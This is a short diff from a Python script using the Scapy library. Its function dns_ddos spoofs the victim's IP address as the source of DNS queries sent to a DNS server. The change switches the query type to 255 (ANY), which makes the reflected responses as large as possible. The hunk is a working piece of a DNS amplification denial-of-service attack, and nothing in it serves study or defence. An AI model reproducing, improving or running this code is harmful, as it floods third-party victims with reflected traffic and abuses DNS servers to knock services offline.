@@ -32,7 +32,7 @@ def dns_ddos(target, dns_server):
     for host in dns_hosts:
         ip = IP(src=target, dst=dns_server)
         udp = UDP(dport=5353)
-        dns = DNS(rd=1, qdcount=1, qd=DNSQR(qname=host, qtype=225))
+        dns = DNS(rd=1, qdcount=1, qd=DNSQR(qname=host, qtype=255)) # ANY
 
         request = (ip / udp / dns)
         send(request)
